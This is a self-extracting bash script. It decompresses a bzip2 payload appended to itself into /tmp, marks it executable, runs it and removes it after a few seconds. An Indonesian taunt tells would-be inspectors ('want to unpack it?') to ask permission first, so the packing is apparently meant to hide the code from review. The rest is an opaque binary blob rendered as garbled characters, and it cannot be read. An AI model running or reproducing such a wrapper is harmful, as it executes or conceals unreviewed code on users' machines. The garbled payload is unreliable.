#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYڐ%� ��E�@ ���?�������@�D@0  `���)t��}��U��xeJH6�&D�h��##��ɣCF������2DI��{D�hP C@ h� 4Дi4�h4� 2CA�� � O�IM7��Pz���d ɐ@  � �Dh�ѣT�Jy�yA�F��F� 4 �$��55�yG�di�<�i��4d�OQ��� zOH2>�6I.:Sk����1?)b��Yy�&��-m�vs8� ��',}FCh��k�FXea�m4ƾ�(�o����kY����LB�%��]/,b\P`T��h��2��L%�����.��F���_��L Q�(�,���ZI#�Z,1R���=c0�^n��Я1�h�R�_�m�rѼ�4�VaY��V�Y�b՛*��y�      =}{gU�'q�3�־j�l�u9��7��W?4�Hq*絊�!��VLX�B� Bo�i�kK�Zc��BmmiL�Br��o�G&�~��r�Yu\L�vivw�G�M�-��D�B�2P���2�5$�^B�_0��T��P�����e�h@<���_�m`��(ro�2X�w�������J'�HG��]�"�J@`w<d�`��hD���!��l�*c. ���`�%�V�Ep}�g)j_�
5+2����pބ!B�#m*��ʒ�����v����P����Q^�[��_�>E;XK�!F�c&@;�Q���l002�/8C< �	��a1�IM֞F��'BR(Z�nO~�=�R��>@��kw"0p((L�O@�	��@�D<vLn��6�RC��/���\�����0������:E]�'�e��hc��G?���7h
<��0C�����\/4ppU��|}���>_(�8��G�����T�<´W#�W7a!�ّ�D�f6$�hx�F>꠫���BI$�����/��-p�"�b?H4�o��-� ����Xo\�H%G��� {!s�0Mj�iv)O7�A
T��!!��!S`o���T7�p<��K�\��3�BA]"sp����U�����D@ ��,���q*�.;�Y`5!��+�g �&�N�Q�D1�P,{b��ֽS���n��OlxA�A$�M�Ap�s�0'0�͠�x��jL�~7/t�s����P�,B�uB����Qo=��WWr����1�c�1�c�1�c�Y��@�W6�:�KxA�<�/��*��30�7�ƥ�����=�/i�1U�W����ioa�=*.:�@�z*���u��!\��6��������(�A]i�7!��Ыv��L�	c))N�Vq����A�V��5����.�H����E��p?ٶ��{���#�d$44���U�79�9�s_��m�v�Et ����0퍣�+��;M�!		h�F��pV��Ep� q�G[��W�3���7�*��C&�1�c5�I%u���x$#$��Q[:�����q�Bg$�{�j�Ԩl[��\+��p� �IV�yUM	UYwu0���3�ۯr�ss�i�:h"���<&��xC�C���!��3��� �I���"�(HmHЀ